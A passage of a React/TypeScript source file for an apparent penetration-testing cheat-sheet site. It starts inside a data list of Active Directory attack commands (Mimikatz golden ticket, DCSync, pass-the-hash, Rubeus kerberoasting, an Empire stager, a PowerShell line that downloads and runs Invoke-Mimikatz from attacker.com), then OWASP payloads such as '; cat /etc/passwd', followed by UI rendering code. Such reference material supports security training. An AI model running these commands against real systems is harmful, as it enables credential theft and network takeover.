                { command: "kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21... /krbtgt:hash /id:500", description: "Create golden ticket", category: "post-exploitation" },
                { command: "lsadump::dcsync /domain:domain.local /user:Administrator", description: "DCSync — dump domain admin hash", category: "dcsync" },
                { command: "sekurlsa::pth /user:admin /domain:domain /ntlm:HASH /run:cmd.exe", description: "Pass-the-Hash shell", category: "pth" },
              ],
            },
            {
              name: "Empire/Starkiller",
              description: "Post-exploitation framework",
              commands: [
                { command: "uselistener http", description: "Create HTTP listener", category: "post-exploitation" },
                { command: "usestager windows/launcher_bat", description: "Generate batch stager", category: "post-exploitation" },
                { command: "agents", description: "List active agents", category: "post-exploitation" },
                { command: "usemodule powershell/credentials/mimikatz/logonpasswords", description: "Run Mimikatz module", category: "post-exploitation" },
              ],
            },
            {
              name: "PowerSploit",
              description: "PowerShell post-exploitation framework",
              commands: [
                { command: "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz\"", description: "Download and execute Mimikatz", category: "post-exploitation" },
                { command: "Get-System", description: "Elevate to SYSTEM", category: "post-exploitation" },
                { command: "Invoke-AllChecks", description: "Run PowerUp privilege escalation checks", category: "post-exploitation" },
              ],
            },
            {
              name: "Rubeus",
              description: "Kerberos attack toolkit",
              commands: [
                { command: "Rubeus.exe kerberoast /outfile:hashes.kerberoast", description: "Kerberoasting — extract service ticket hashes", category: "kerberoast" },
                { command: "Rubeus.exe asreproast /format:hashcat /outfile:asprep.txt", description: "AS-REP Roasting", category: "asrep" },
                { command: "Rubeus.exe ptt /ticket:ticket.kirbi", description: "Pass-the-Ticket attack", category: "ptt" },
              ],
            },
          ],
        },
      ],
    },

    {
      title: "OWASP Top 10 — 2021",
      description: "Detailed breakdown of OWASP Top 10 vulnerabilities with exploitation techniques",
      vulnerabilities: [
        {
          rank: 1,
          name: "Broken Access Control",
          severity: "Critical",
          description: "Restrictions on authenticated users not properly enforced",
          examples: [
            "Bypassing access control checks by modifying URL, internal application state, or HTML page",
            "Permitting viewing or editing someone else's account",
            "Accessing API with missing access controls for POST, PUT and DELETE",
            "Elevation of privilege (acting as admin when logged in as user)",
            "Metadata manipulation (replaying or tampering JWT tokens)",
            "CORS misconfiguration allowing API access from unauthorized origins",
            "Force browsing to authenticated pages as unauthenticated user",
          ],
          testMethods: [
            "Parameter manipulation (change user ID in URL)",
            "Forced browsing to admin pages",
            "Missing function level access control",
            "Insecure direct object references (IDOR)",
          ],
          payloads: [
            { payload: "/user/profile?id=123 → /user/profile?id=456", description: "IDOR - Access another user's profile", context: "Parameter manipulation" },
            { payload: "/api/users/123 → /api/admin/users/123", description: "Path manipulation for privilege escalation", context: "API access control" },
          ],
          tools: ["Burp Suite", "OWASP ZAP", "Manual testing"],
        },
        {
          rank: 2,
          name: "Cryptographic Failures",
          severity: "High",
          description: "Sensitive data exposed due to weak or missing encryption",
          examples: [
            "Transmitting data in clear text (HTTP, FTP, SMTP)",
            "Using old or weak cryptographic algorithms",
            "Weak or default crypto keys",
            "Missing encryption for sensitive data at rest",
            "Improper certificate validation",
            "Lack of proper key management",
          ],
          testMethods: [
            "Check for HTTP instead of HTTPS",
            "Analyze encryption algorithms used",
            "Test for weak SSL/TLS configurations",
            "Check for sensitive data in browser storage",
          ],
          tools: ["SSLScan", "testssl.sh", "Nmap SSL scripts"],
        },
        {
          rank: 3,
          name: "Injection",
          severity: "Critical",
          description: "Untrusted data sent to interpreter as part of command or query",
          types: ["SQL Injection", "NoSQL Injection", "OS Command Injection", "LDAP Injection", "XPath Injection", "XML Injection"],
          payloads: [
            { payload: "' OR 1=1 --", description: "SQL injection auth bypass", context: "login" },
            { payload: "{{7*7}}", description: "SSTI probe", context: "template fields" },
            { payload: "; cat /etc/passwd", description: "OS command injection", context: "system calls" },
            { payload: "../../../etc/passwd", description: "Path traversal", context: "file operations" },
          ],
          tools: ["sqlmap", "commix", "dotdotpwn"],
          covered: "See detailed SQL Injection and Command Injection sections above",
        },
        {
          rank: 4,
          name: "Insecure Design",
          severity: "High",
          description: "Missing or ineffective control design",
          examples: [
            "Lack of rate limiting leading to account takeover",
            "Missing business logic validation",
            "Trusting client-side controls",
            "Insufficient logging and monitoring",
          ],
        },
        {
          rank: 5,
          name: "Security Misconfiguration",
          severity: "High",
          description: "Insecure default configurations, incomplete setups, open cloud storage",
          examples: [
            "Missing security hardening",
            "Unnecessary features enabled",
            "Default accounts with passwords",
            "Error handling reveals stack traces",
            "Latest security features disabled",
            "Security settings in application servers not set to secure values",
            "Outdated software versions",
          ],
          testMethods: [
            "Check for default credentials",
            "Directory listing enabled",
            "Verbose error messages",
            "Unnecessary HTTP methods enabled",
            "Security headers missing",
          ],
          tools: ["nikto", "dirb", "gobuster"],
        },
        {
          rank: 6,
          name: "Vulnerable and Outdated Components",
          severity: "High",
          description: "Using components with known vulnerabilities",
          examples: [
            "Unsupported or out of date software",
            "Not scanning for vulnerabilities regularly",
            "Not securing component configurations",
            "Developers not testing compatibility of updated libraries",
          ],
          tools: ["OWASP Dependency-Check", "Retire.js", "Snyk", "npm audit", "Bundle-audit (Ruby)"],
        },
        {
          rank: 7,
          name: "Identification and Authentication Failures",
          severity: "Critical",
          description: "Broken authentication and session management",
          examples: [
            "Permits brute force attacks",
            "Permits default, weak, or well-known passwords",
            "Uses weak credential recovery (knowledge-based answers)",
            "Missing or ineffective multi-factor authentication",
            "Exposes session identifiers in URL",
            "Doesn't properly invalidate session tokens",
          ],
          testMethods: [
            "Test password policy",
            "Session fixation testing",
            "Session timeout testing",
            "Brute force protection testing",
          ],
        },
        {
          rank: 8,
          name: "Software and Data Integrity Failures",
          severity: "Critical",
          description: "Code and infrastructure that doesn't protect against integrity violations",
          examples: [
            "Insecure CI/CD pipeline",
            "Auto-update without integrity verification",
            "Insecure deserialization",
            "CDN or content from untrusted sources",
          ],
          covered: "See Insecure Deserialization section above",
        },
        {
          rank: 9,
          name: "Security Logging and Monitoring Failures",
          severity: "Medium",
          description: "Insufficient logging and monitoring, coupled with ineffective incident response",
          examples: [
            "Auditable events not logged",
            "Warnings and errors generate no/inadequate log messages",
            "Logs not monitored for suspicious activity",
            "Logs only stored locally",
            "Alerting thresholds and response escalation not in place",
          ],
        },
        {
          rank: 10,
          name: "Server-Side Request Forgery (SSRF)",
          severity: "High",
          description: "Web application fetching remote resource without validating user-supplied URL",
          covered: "See detailed SSRF section above",
        },
      ],
    },

    {
      title: "Common Network Ports Reference",
      description: "TCP/UDP port assignments with associated services and known vulnerabilities",
      ports: [
        { port: 20, service: "FTP Data", vulnerabilities: ["Cleartext credentials", "Anonymous access"] },
        { port: 21, service: "FTP Control", vulnerabilities: ["Cleartext credentials", "Anonymous access", "Brute force"] },
        { port: 22, service: "SSH", vulnerabilities: ["Weak credentials", "Key exposure", "Version vulnerabilities"] },
        { port: 23, service: "Telnet", vulnerabilities: ["Cleartext credentials", "No encryption"] },
        { port: 25, service: "SMTP", vulnerabilities: ["Email spoofing", "Open relay", "User enumeration"] },
        { port: 53, service: "DNS", vulnerabilities: ["Zone transfer", "DNS amplification", "Cache poisoning"] },
        { port: 80, service: "HTTP", vulnerabilities: ["Web application attacks", "Cleartext traffic"] },
        { port: 110, service: "POP3", vulnerabilities: ["Cleartext credentials", "Email harvesting"] },
        { port: 111, service: "RPCbind", vulnerabilities: ["Service enumeration", "RPC exploits"] },
        { port: 135, service: "MSRPC", vulnerabilities: ["Windows enumeration", "RPC exploits"] },
        { port: 139, service: "NetBIOS", vulnerabilities: ["SMB enumeration", "Null sessions"] },
        { port: 143, service: "IMAP", vulnerabilities: ["Cleartext credentials", "Email harvesting"] },
        { port: 161, service: "SNMP", vulnerabilities: ["Community string brute force", "Information disclosure"] },
        { port: 389, service: "LDAP", vulnerabilities: ["LDAP injection", "Anonymous bind"] },
        { port: 443, service: "HTTPS", vulnerabilities: ["SSL/TLS vulnerabilities", "Certificate issues"] },
        { port: 445, service: "SMB", vulnerabilities: ["EternalBlue (MS17-010)", "PSExec", "Credential theft"] },
        { port: 1433, service: "MSSQL", vulnerabilities: ["SQL injection", "xp_cmdshell", "Weak credentials"] },
        { port: 1521, service: "Oracle DB", vulnerabilities: ["SQL injection", "Default credentials"] },
        { port: 3306, service: "MySQL", vulnerabilities: ["SQL injection", "Weak credentials", "UDF exploitation"] },
        { port: 3389, service: "RDP", vulnerabilities: ["BlueKeep (CVE-2019-0708)", "Weak credentials", "Brute force"] },
        { port: 5432, service: "PostgreSQL", vulnerabilities: ["SQL injection", "Command execution"] },
        { port: 5900, service: "VNC", vulnerabilities: ["Weak/no authentication", "Screen capture"] },
        { port: 5985, service: "WinRM", vulnerabilities: ["Default creds", "PTH via CME", "Evil-WinRM"] },
        { port: 6379, service: "Redis", vulnerabilities: ["No authentication", "Remote code execution"] },
        { port: 8080, service: "HTTP Proxy", vulnerabilities: ["Web application attacks", "Tomcat exploits"] },
        { port: 8443, service: "HTTPS Alt", vulnerabilities: ["SSL/TLS issues", "Web app vulnerabilities"] },
        { port: 27017, service: "MongoDB", vulnerabilities: ["No authentication", "NoSQL injection"] },
      ],
    },
  ],
};

/* ─────────────────────────────────────────────────────────
   GLOBAL CSS
───────────────────────────────────────────────────────── */
const GLOBAL_CSS = `
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap');

  :root {
    --cyan:   #00ffe7;
    --cyan-d: #00ccbb;
    --cyan-b: rgba(0,255,231,0.08);
    --red:    #ff2d55;
    --blue:   #3b82f6;
    --purple: #a855f7;
    --amber:  #fbbf24;
    --green:  #34d399;
    --bg:     transparent;
    --bg1:    rgba(0,17,26,0.85);
    --bg2:    rgba(4,13,20,0.85);
  }

  @keyframes scanline { 0% { transform: translateY(-100vh); } 100% { transform: translateY(200vh); } }
  @keyframes flicker { 0%,100% { opacity:1; } 92% { opacity:1; } 93% { opacity:0.3; } 94% { opacity:1; } 96% { opacity:0.5; } 97% { opacity:1; } }
  @keyframes neonPulse { 0%,100% { text-shadow: 0 0 4px var(--cyan), 0 0 12px rgba(0,255,231,.4); } 50% { text-shadow: 0 0 10px var(--cyan), 0 0 30px rgba(0,255,231,.6), 0 0 60px rgba(0,255,231,.25); } }
  @keyframes sweepLine { 0% { left: -100%; } 100% { left: 200%; } }
  @keyframes cornerFlash { 0%,90%,100% { opacity:0; } 92%,98% { opacity:1; } }
  @keyframes dotBlink { 0%,100% { opacity:1; } 50% { opacity:0; } }
  @keyframes borderPing { 0% { transform: scale(1); opacity: .8; } 100% { transform: scale(2.2); opacity: 0; } }

  .neon-text   { animation: neonPulse 3s ease-in-out infinite; }
  .flicker     { animation: flicker 8s infinite; }
  .scan-beam   { animation: scanline 9s linear infinite; }
  .dot-blink   { animation: dotBlink 1s step-end infinite; }
  .corner-flash { animation: cornerFlash 4s ease-in-out infinite; }

  ::-webkit-scrollbar { width: 4px; height: 4px; }
  ::-webkit-scrollbar-track { background: rgba(2,5,9,0.8); }
  ::-webkit-scrollbar-thumb { background: rgba(0,255,231,.2); border-radius: 2px; }

  .mono  { font-family: 'Share Tech Mono', monospace; }
  .orbit { font-family: 'Orbitron', sans-serif; }
  .raj   { font-family: 'Rajdhani', sans-serif; }

  .nav-sweep { position: relative; overflow: hidden; }
  .nav-sweep::after {
    content: '';
    position: absolute;
    inset-block: 0;
    width: 35%;
    background: linear-gradient(90deg, transparent, rgba(0,255,231,.07), transparent);
    left: -100%;
    pointer-events: none;
  }
  .nav-sweep:hover::after { animation: sweepLine .55s ease forwards; }

  .cmd-bar { border-left: 2px solid var(--cyan-d); background: var(--bg2); transition: border-left-color .15s, background .15s; }
  .cmd-bar:hover { border-left-color: var(--cyan); background: rgba(0,29,43,0.9); }
  .pay-bar { border-left: 2px solid #bb5500; background: rgba(8,3,0,0.85); transition: border-left-color .15s, background .15s; }
  .pay-bar:hover { border-left-color: #ff8800; background: rgba(19,6,0,0.9); }

  .toggle-icon { display:inline-block; transition: transform .2s; }
  .toggle-icon.open { transform: rotate(90deg); }

  .prog-fill {
    height: 100%;
    background: linear-gradient(90deg, rgba(0,255,231,.3), var(--cyan));
    box-shadow: 0 0 8px rgba(0,255,231,.5);
    border-radius: 3px;
    transition: width .45s cubic-bezier(.4,0,.2,1);
  }

  .sev-c { color: #ff3355; }
  .sev-h { color: #ff6600; }
  .sev-m { color: #ffaa00; }
  .sev-l { color: #00aaff; }
`;

/* ─────────────────────────────────────────────────────────
   ANIMATION VARIANTS
───────────────────────────────────────────────────────── */
const pageFade: Variants = { hidden: { opacity: 0 }, visible: { opacity: 1, transition: { duration: .7 } } };
const fadeUp: Variants = { hidden: { opacity: 0, y: 28 }, visible: { opacity: 1, y: 0, transition: { duration: .55, ease: [.25,.1,.25,1] } } };
const fadeLeft: Variants = { hidden: { opacity: 0, x: -22 }, visible: { opacity: 1, x: 0, transition: { duration: .5, ease: [.25,.1,.25,1] } } };
const stagger: Variants = { hidden: {}, visible: { transition: { staggerChildren: .09, delayChildren: .04 } } };
const staggerFast: Variants = { hidden: {}, visible: { transition: { staggerChildren: .07 } } };
const drawerVariants: Variants = {
  hidden:  { x: -280, opacity: 0 },
  visible: { x: 0, opacity: 1, transition: { type: "tween", duration: .22 } },
  exit:    { x: -280, opacity: 0, transition: { duration: .18 } },
};

/* ─────────────────────────────────────────────────────────
   PARTICLE FIELD
───────────────────────────────────────────────────────── */
const ParticleField = memo(() => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  useEffect(() => {
    const canvas = canvasRef.current!;
    const ctx = canvas.getContext("2d")!;
    const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
    resize();
    window.addEventListener("resize", resize);
    const particles = Array.from({ length: 70 }, () => ({
      x: Math.random() * canvas.width, y: Math.random() * canvas.height,
      vx: (Math.random() - .5) * .35, vy: (Math.random() - .5) * .35,
      r: Math.random() * 1.4 + .4,
      color: Math.random() > .5 ? "#00ffe7" : Math.random() > .5 ? "#3b82f6" : "#a855f7",
      opacity: Math.random() * .5 + .15,
    }));
    let animId: number;
    const draw = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x, dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < 110) {
            ctx.beginPath(); ctx.strokeStyle = `rgba(0,255,231,${(1 - dist / 110) * .1})`; ctx.lineWidth = .5;
            ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y); ctx.stroke();
          }
        }
        const p = particles[i];
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = p.color; ctx.globalAlpha = p.opacity; ctx.shadowColor = p.color; ctx.shadowBlur = 5;
        ctx.fill(); ctx.globalAlpha = 1; ctx.shadowBlur = 0;
      }
      animId = requestAnimationFrame(draw);
    };
    draw();
    return () => { cancelAnimationFrame(animId); window.removeEventListener("resize", resize); };
  }, []);
  return <canvas ref={canvasRef} className="fixed inset-0 w-full h-full pointer-events-none" style={{ zIndex: 0, opacity: .6 }} />;
});
ParticleField.displayName = "ParticleField";

/* ─────────────────────────────────────────────────────────
   CYBER CORNER BRACKETS
───────────────────────────────────────────────────────── */
const CyberCorner = ({ pos, color = "rgba(0,255,231,0.55)" }: { pos: "tl"|"tr"|"bl"|"br"; color?: string }) => {
  const base: React.CSSProperties = { position: "absolute", width: 14, height: 14, borderColor: color };
  const map: Record<string, React.CSSProperties> = {
    tl: { top: 0, left: 0, borderTop: "1.5px solid", borderLeft: "1.5px solid" },
    tr: { top: 0, right: 0, borderTop: "1.5px solid", borderRight: "1.5px solid" },
    bl: { bottom: 0, left: 0, borderBottom: "1.5px solid", borderLeft: "1.5px solid" },
    br: { bottom: 0, right: 0, borderBottom: "1.5px solid", borderRight: "1.5px solid" },
  };
  return <div className="corner-flash" style={{ ...base, ...map[pos] }} />;
};

/* ─────────────────────────────────────────────────────────
   COPY BUTTON
───────────────────────────────────────────────────────── */
const CopyBtn = memo(({ text, accent = "rgba(0,255,231,.35)" }: { text: string; accent?: string }) => {
  const [copied, setCopied] = useState(false);
  const handle = useCallback((e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(text).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  }, [text]);
  return (
    <motion.button onClick={handle} whileTap={{ scale: .9 }}
      style={{ fontSize: 10, fontFamily: "'Share Tech Mono', monospace", color: copied ? "var(--cyan)" : accent, background: "none", border: "none", cursor: "pointer", whiteSpace: "nowrap", transition: "color .15s", display: "flex", alignItems: "center", gap: 4 }}>
      {copied ? <><CheckCheck size={10} /> COPIED</> : <><Copy size={10} /> COPY</>}
    </motion.button>
  );
});
CopyBtn.displayName = "CopyBtn";

/* ─────────────────────────────────────────────────────────
   DIVIDER LABEL
───────────────────────────────────────────────────────── */
const DividerLabel = ({ label, color }: { label: string; color: string }) => (
  <div className="flex items-center gap-2 mb-2">
    <div className="flex-1 h-px" style={{ background: color, opacity: .2 }} />
    <span className="orbit font-bold rounded px-2 py-0.5"
      style={{ fontSize: 9, color, background: `${color}12`, border: `1px solid ${color}28`, letterSpacing: ".18em" }}>
      {label}
    </span>
    <div className="flex-1 h-px" style={{ background: color, opacity: .2 }} />
  </div>
);

/* ─────────────────────────────────────────────────────────
   SEVERITY HELPERS
───────────────────────────────────────────────────────── */
const SEV_MAP: Record<string, { cls: string; border: string; bg: string }> = {
  critical: { cls: "sev-c", border: "rgba(255,51,85,.35)",  bg: "rgba(255,51,85,.08)"  },
  high:     { cls: "sev-h", border: "rgba(255,102,0,.35)",  bg: "rgba(255,102,0,.08)"  },
  medium:   { cls: "sev-m", border: "rgba(255,170,0,.3)",   bg: "rgba(255,170,0,.06)"  },
  low:      { cls: "sev-l", border: "rgba(0,170,255,.3)",   bg: "rgba(0,170,255,.06)"  },
};
const getSev = (s = "low") => SEV_MAP[(s).toLowerCase()] ?? SEV_MAP.low;

/* ─────────────────────────────────────────────────────────
   COMMAND BLOCK
───────────────────────────────────────────────────────── */
const CommandBlock = memo(({ cmd }: { cmd: Command }) => (
  <div className="cmd-bar rounded-r-md px-3 py-2.5 cursor-pointer group">
    <div className="flex items-start justify-between gap-3">
      <div className="min-w-0 flex-1">
        <div className="flex items-start gap-1.5 mb-1">
          <span className="mono shrink-0 mt-px" style={{ fontSize: 11, color: "var(--cyan-d)" }}>$</span>
          <code className="mono break-all leading-relaxed" style={{ fontSize: 11, color: "var(--cyan)" }}>{cmd.command}</code>
        </div>
        <p className="mono leading-relaxed" style={{ fontSize: 10, color: "rgba(0,255,231,.38)" }}>{cmd.description}</p>
      </div>
      <div className="flex flex-col items-end gap-1 shrink-0">
        {cmd.category && (
          <span className="mono rounded px-1.5 py-0.5"
            style={{ fontSize: 9, background: "rgba(0,255,231,.07)", color: "rgba(0,255,231,.4)", border: "1px solid rgba(0,255,231,.14)" }}>
            {cmd.category}
          </span>
        )}
        <CopyBtn text={cmd.command} />
      </div>
    </div>
  </div>
));
CommandBlock.displayName = "CommandBlock";

/* ─────────────────────────────────────────────────────────
   PAYLOAD BLOCK
───────────────────────────────────────────────────────── */
const PayloadBlock = memo(({ payload, description, context }: { payload: string; description: string; context: string }) => (
  <div className="pay-bar rounded-r-md px-3 py-2.5 cursor-pointer">
    <div className="flex items-start justify-between gap-3">
      <div className="min-w-0 flex-1">
        <code className="mono break-all leading-relaxed block mb-1"
          style={{ fontSize: 11, color: "#ff8800", textShadow: "0 0 4px rgba(255,136,0,.2)" }}>
          {payload}
        </code>
        <p className="mono" style={{ fontSize: 10, color: "rgba(255,136,0,.4)" }}>
          {description}{context ? ` [${context}]` : ""}
        </p>
      </div>
      <CopyBtn text={payload} accent="rgba(255,136,0,.4)" />
    </div>
  </div>
));
PayloadBlock.displayName = "PayloadBlock";

/* ─────────────────────────────────────────────────────────
   CODE BLOCK
───────────────────────────────────────────────────────── */
const CodeBlock = memo(({ name, code, description, color }: { name: string; code: string; description: string; color: string }) => (
  <div className="rounded-lg overflow-hidden" style={{ background: "rgba(0,0,0,0.85)", border: `1px solid ${color}22` }}>
    <div className="flex items-center justify-between px-3 py-1.5" style={{ background: `${color}0d`, borderBottom: `1px solid ${color}18` }}>
      <span className="orbit font-bold" style={{ fontSize: 10, color, letterSpacing: ".08em" }}>{name}</span>
      <CopyBtn text={code} accent={`${color}60`} />
    </div>
    <pre className="px-3 py-2.5 mono overflow-x-auto leading-relaxed" style={{ fontSize: 10, color: `${color}bb`, whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
      <code>{code}</code>
    </pre>
    {description && <p className="px-3 pb-2 mono" style={{ fontSize: 10, color: `${color}45` }}>{description}</p>}
  </div>
));
CodeBlock.displayName = "CodeBlock";

/* ─────────────────────────────────────────────────────────
   TOOL CARD
───────────────────────────────────────────────────────── */
const ToolCard = memo(({ tool }: { tool: Tool }) => {
  const [open, setOpen] = useState(true);
  return (
    <motion.div variants={fadeUp} className="rounded-lg overflow-hidden"
      style={{ background: "var(--bg2)", border: "1px solid rgba(0,255,231,.1)" }}
      whileHover={{ borderColor: "rgba(0,255,231,.28)", boxShadow: "0 0 20px rgba(0,255,231,.06)" }}
      transition={{ duration: .2 }}>
      <button onClick={() => setOpen(v => !v)} className="w-full flex items-center justify-between px-4 py-3 nav-sweep"
        style={{ background: "transparent", cursor: "pointer" }}>
        <div className="flex items-center gap-2.5 min-w-0">
          <span className="mono shrink-0" style={{ fontSize: 10, color: "var(--cyan-d)" }}>▶</span>
          <span className="orbit font-bold truncate" style={{ fontSize: 13, color: "var(--cyan)", letterSpacing: ".04em" }}>{tool.name}</span>
          {tool.notes && (
            <span className="mono rounded px-1.5 hidden sm:inline"
              style={{ fontSize: 9, background: "rgba(255,170,0,.1)", color: "#ffaa00", border: "1px solid rgba(255,170,0,.2)" }}>NOTE</span>
          )}
        </div>
        <div className="flex items-center gap-2 shrink-0 ml-2">
          <span className="mono hidden sm:inline" style={{ fontSize: 9, color: "rgba(0,255,231,.25)" }}>
            {tool.commands.length} CMD{tool.commands.length !== 1 ? "S" : ""}
          </span>
          <span className={`toggle-icon mono text-xs ${open ? "open" : ""}`} style={{ color: "var(--cyan-d)" }}>▶</span>
        </div>
      </button>
      {tool.description && <p className="px-4 pb-1 mono" style={{ fontSize: 10, color: "rgba(0,255,231,.35)" }}>{tool.description}</p>}
      {tool.notes && <p className="px-4 pb-1.5 mono" style={{ fontSize: 10, color: "#cc8800" }}>⚠ {tool.notes}</p>}
      <AnimatePresence initial={false}>
        {open && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }}
            transition={{ duration: .25, ease: "easeInOut" }} style={{ overflow: "hidden" }}>
            <div className="px-4 pb-4 pt-1 flex flex-col gap-2">
              {tool.commands.map((c, i) => <CommandBlock key={i} cmd={c} />)}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
});
ToolCard.displayName = "ToolCard";

/* ─────────────────────────────────────────────────────────
   VULNERABILITY CARD
───────────────────────────────────────────────────────── */
const VulnCard = memo(({ vuln }: { vuln: Vulnerability }) => {
  const [open, setOpen] = useState(true);
  const sev = getSev(vuln.severity);
  return (
    <motion.div variants={fadeUp} className="rounded-lg overflow-hidden"
      style={{ background: "rgba(6,0,8,0.85)", border: `1px solid ${sev.border}` }}
      whileHover={{ boxShadow: `0 0 24px ${sev.border}` }} transition={{ duration: .2 }}>
      <div className="relative overflow-hidden" style={{ height: 1 }}>
        <motion.div animate={{ x: ["-100%", "200%"] }} transition={{ duration: 2.5, repeat: Infinity, repeatDelay: 4, ease: "easeInOut" }}
          className="absolute inset-y-0 w-1/2" style={{ background: `linear-gradient(90deg, transparent, ${sev.border}, transparent)` }} />
      </div>
      <button onClick={() => setOpen(v => !v)} className="w-full flex items-start justify-between px-4 py-3 nav-sweep text-left"
        style={{ background: "transparent", cursor: "pointer" }}>
        <div className="flex items-start gap-2.5 min-w-0">
          <span className="text-sm shrink-0 mt-0.5" style={{ color: sev.border }}>⚠</span>
          <div className="min-w-0">
            <h4 className={`orbit font-bold ${sev.cls}`} style={{ fontSize: 13 }}>{vuln.name}</h4>
            {vuln.description && <p className="mono mt-0.5" style={{ fontSize: 10, color: "rgba(255,255,255,.25)" }}>{vuln.description}</p>}
          </div>
        </div>
        <div className="flex items-center gap-2 shrink-0 ml-3">
          <span className={`orbit font-bold rounded px-2 py-0.5 ${sev.cls}`}
            style={{ fontSize: 9, background: sev.bg, border: `1px solid ${sev.border}` }}>
            {(vuln.severity ?? "LOW").toUpperCase()}
          </span>
          <span className={`toggle-icon text-xs ${open ? "open" : ""}`} style={{ color: "rgba(255,255,255,.28)" }}>▶</span>
        </div>
      </button>
      <AnimatePresence initial={false}>
        {open && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }}
            transition={{ duration: .25, ease: "easeInOut" }} style={{ overflow: "hidden" }}>
            <div className="px-4 pb-4 flex flex-col gap-3">
              {vuln.manualExploits?.length && (
                <div>
                  <DividerLabel label="MANUAL PAYLOADS" color="#ff8800" />
                  <div className="flex flex-col gap-2">
                    {vuln.manualExploits.map((e, i) => <PayloadBlock key={i} payload={e.payload} description={e.description} context={e.context} />)}
                  </div>
                </div>
              )}
              {(vuln.types as XSSType[] | undefined)?.map((t, i) => (
                <div key={i}>
                  <DividerLabel label={(t.type ?? "TYPE").toUpperCase()} color="#ff8800" />
                  <div className="flex flex-col gap-2">
                    {t.payloads.map((p, j) => <PayloadBlock key={j} payload={p.payload} description={p.description} context={p.context} />)}
                  </div>
                </div>
              ))}
              {vuln.payloads?.length && (
                <div>
                  <DividerLabel label="PAYLOADS" color="#ff8800" />
                  <div className="flex flex-col gap-2">
                    {vuln.payloads.map((p, i) => <PayloadBlock key={i} payload={p.payload} description={p.description} context={p.context} />)}
                  </div>
                </div>
              )}
              {vuln.reverseShells?.length && (
                <div>
                  <DividerLabel label="REVERSE SHELLS" color="#00eeff" />
                  <div className="flex flex-col gap-2">
                    {vuln.reverseShells.map((s, i) => (
                      <div key={i} className="cmd-bar rounded-r-md px-3 py-2.5">
                        <div className="flex items-start justify-between gap-2">
                          <div className="min-w-0 flex-1">
                            <span className="orbit font-bold block mb-0.5" style={{ fontSize: 9, color: "var(--cyan-d)" }}>{s.name}</span>
                            <code className="mono break-all block" style={{ fontSize: 11, color: "var(--cyan)" }}>{s.command}</code>
                            <p className="mono mt-0.5" style={{ fontSize: 10, color: "rgba(0,255,231,.35)" }}>{s.description}</p>
                          </div>
                          <CopyBtn text={s.command} />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              {vuln.exploits?.length && (
                <div>
                  <DividerLabel label="EXPLOIT CODE" color="#cc44ff" />
                  <div className="flex flex-col gap-2">
                    {vuln.exploits.map((e, i) => <CodeBlock key={i} name={e.name} code={e.code} description={e.description} color="#cc44ff" />)}
                  </div>
                </div>
              )}
              {vuln.examples?.length && (
                <div>
                  <DividerLabel label="EXAMPLES" color="#ffaa00" />
                  <div className="flex flex-col gap-2">
                    {(vuln.examples as DeserializationExample[]).map((e, i) => (
                      <CodeBlock key={i} name={e.language} code={e.payload} description={e.description} color="#ffaa00" />
                    ))}
                  </div>
                </div>
              )}
              {vuln.tools?.map((t, i) => (
                <div key={i}>
                  <DividerLabel label={`TOOL: ${t.name}`} color="#00eeff" />
                  <div className="flex flex-col gap-2">
                    {t.commands.map((c, j) => <CommandBlock key={j} cmd={c} />)}
                  </div>
                </div>
              ))}
              {vuln.notes && <p className="mono mt-1" style={{ fontSize: 10, color: "#cc8800" }}>⚠ {vuln.notes}</p>}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
});
VulnCard.displayName = "VulnCard";

/* ─────────────────────────────────────────────────────────
   PORT GRID
───────────────────────────────────────────────────────── */
const PortGrid = memo(({ ports }: { ports: Port[] }) => (
  <motion.div variants={staggerFast} initial="hidden" animate="visible" className="grid gap-3"
    style={{ gridTemplateColumns: "repeat(auto-fill, minmax(200px, 1fr))" }}>
    {ports.map((p, i) => (
      <motion.div key={i} variants={fadeUp} className="rounded-lg p-3"
        style={{ background: "var(--bg2)", border: "1px solid rgba(0,255,231,.1)" }}
        whileHover={{ borderColor: "rgba(0,255,231,.3)", boxShadow: "0 0 18px rgba(0,255,231,.06)" }}>
        <div className="flex items-center justify-between mb-2">
          <span className="orbit font-bold" style={{ fontSize: 15, color: "var(--cyan)", textShadow: "0 0 10px rgba(0,255,231,.3)" }}>
            :{p.port}
          </span>
          <span className="mono rounded px-2 py-0.5"
            style={{ fontSize: 9, background: "rgba(0,255,231,.07)", color: "rgba(0,255,231,.45)", border: "1px solid rgba(0,255,231,.15)" }}>
            {p.service}
          </span>
        </div>
        <ul className="flex flex-col gap-1">
          {p.vulnerabilities.map((v, j) => (
            <li key={j} className="mono flex gap-1.5 break-words" style={{ fontSize: 10, color: "rgba(255,51,85,.7)" }}>
              <span style={{ color: "rgba(255,51,85,.35)", flexShrink: 0 }}>•</span>{v}
            </li>
          ))}
        </ul>
      </motion.div>
    ))}
  </motion.div>
));
PortGrid.displayName = "PortGrid";

/* ─────────────────────────────────────────────────────────
   OWASP CARD
───────────────────────────────────────────────────────── */
